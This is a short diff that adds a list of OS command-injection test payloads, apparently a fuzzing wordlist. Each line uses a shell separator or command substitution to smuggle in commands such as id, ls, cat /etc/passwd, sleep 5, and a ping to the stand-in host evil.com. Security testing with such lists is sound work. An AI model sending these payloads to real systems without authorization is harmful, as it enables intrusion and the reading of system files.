@@ -1,0 +1,14 @@
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+;ls
+|ls
+;cat /etc/passwd
+|cat /etc/passwd
+& ping -c 1 evil.com &
+; sleep 5
+| sleep 5
